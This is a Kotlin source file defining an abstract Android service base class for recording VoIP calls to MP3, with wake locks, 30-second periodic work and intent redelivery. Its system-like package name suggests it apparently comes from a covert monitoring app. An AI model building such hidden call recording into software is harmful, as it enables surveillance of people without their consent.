package com.android.services.services.voip

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.PowerManager
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.models.VoipCallRecord
import com.android.services.util.AppUtils
import com.android.services.util.Mp3LameRecorder
import io.reactivex.rxjava3.disposables.Disposable
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

abstract class VoipCallCommandProcessingBaseI(
    val applicationContext: Context,
) : IBackgroundProcessing {

    internal val executorService: ExecutorService = Executors.newSingleThreadExecutor()
    internal var recorder: Mp3LameRecorder? = null
    internal lateinit var randomUniqueId: String
    internal lateinit var mFilePath: String
    internal var mRecordingStartTime: Long = 0
    internal var wakeLock: PowerManager.WakeLock? = null
    internal var voipCallRecord: VoipCallRecord? = null
    internal var disposable: Disposable? = null

    companion object {
        internal const val TOS_VOIP_CALL_WORK = "myApp:TOSVoipCallWork"
        const val VOIP_CALL_RECORD = "VOIP_CALL_RECORD"
        internal const val INITIAL_DELAY = 30 * 1000L
        internal const val PERIODIC_INTERVAL = 30 * 1000L
        internal var intervalConsumed: Int = 0
        const val VOIP_CALL_RECORD_NOTIFICATION_ID = 106

        @JvmStatic
        var voipCallStatus: String? = null
    }

    abstract fun initialize()
    abstract fun parseIntent(intent: Intent?)
    abstract fun createOutputFilePath()
    abstract fun startRecording()
    abstract fun startCommand()
    abstract suspend fun stopRecording()
    abstract fun onServiceDestroy()

    override fun onCreate() {
        initialize()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startCommand()
        createOutputFilePath()
        parseIntent(intent)
        return Service.START_REDELIVER_INTENT
    }

    override fun onDestroy() {
        onServiceDestroy()
    }
}